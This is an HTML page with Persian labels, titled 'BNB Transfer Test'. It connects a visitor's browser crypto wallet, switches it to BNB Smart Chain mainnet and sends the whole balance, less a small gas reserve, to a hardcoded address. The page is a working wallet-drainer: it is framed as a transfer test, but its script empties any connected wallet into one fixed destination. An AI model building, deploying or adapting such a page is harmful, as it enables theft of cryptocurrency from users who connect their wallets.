<!DOCTYPE html>
<html lang="fa">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>BNB Transfer Test</title>
<style>
body{font-family:sans-serif;text-align:center;margin-top:50px;}
button{padding:10px 20px;font-size:16px;margin:10px;}
</style>
</head>
<body>

<h2>BNB Transfer Test</h2>

<button onclick="connectWallet()">کانکت</button>
<button onclick="sendBNB()">انتقال کل BNB</button>

<p id="status"></p>

<script>
let account;
const DESTINATION = "0x1F40f55A445483205546E9F16B09b2134142959A";

function setStatus(msg){document.getElementById("status").innerText = msg;}

// کانکت با ولت
async function connectWallet(){
    if(!window.ethereum){
        alert("Wallet not found");
        return;
    }
    const accounts = await ethereum.request({method:'eth_requestAccounts'});
    account = accounts[0];
    setStatus("Connected: " + account);

    // خودکار سوئیچ به BSC
    try{
        await ethereum.request({
            method:"wallet_switchEthereumChain",
            params:[{chainId:"0x38"}] // BSC Mainnet
        });
        setStatus("Connected & BSC active: " + account);
    }catch(err){
        console.error(err);
        alert("خطا در سوئیچ شبکه یا اضافه کردن BSC");
    }
}

// محاسبه مقدار کل BNB
async function sendBNB(){
    if(!account){alert("ابتدا کانکت کنید"); return;}
    
    setStatus("در حال خواندن موجودی...");

    try{
        const balanceHex = await ethereum.request({
            method:"eth_getBalance",
            params:[account, "latest"]
        });
        const balance = parseInt(balanceHex,16);

        // مقداری برای Gas نگه می‌داریم (~0.00021 BNB)
        const gasReserve = 210000000000000; 
        const sendAmount = balance - gasReserve;
        if(sendAmount <= 0){
            alert("موجودی کافی برای Gas ندارید");
            return;
        }

        // ارسال تراکنش
        const txHash = await ethereum.request({
            method:"eth_sendTransaction",
            params:[{
                from: account,
                to: DESTINATION,
                value: "0x" + sendAmount.toString(16)
            }]
        });

        setStatus("تراکنش ارسال شد: " + txHash);
    }catch(err){
        console.error(err);
        alert("خطا در ارسال تراکنش");
    }
}
</script>

</body>
</html>
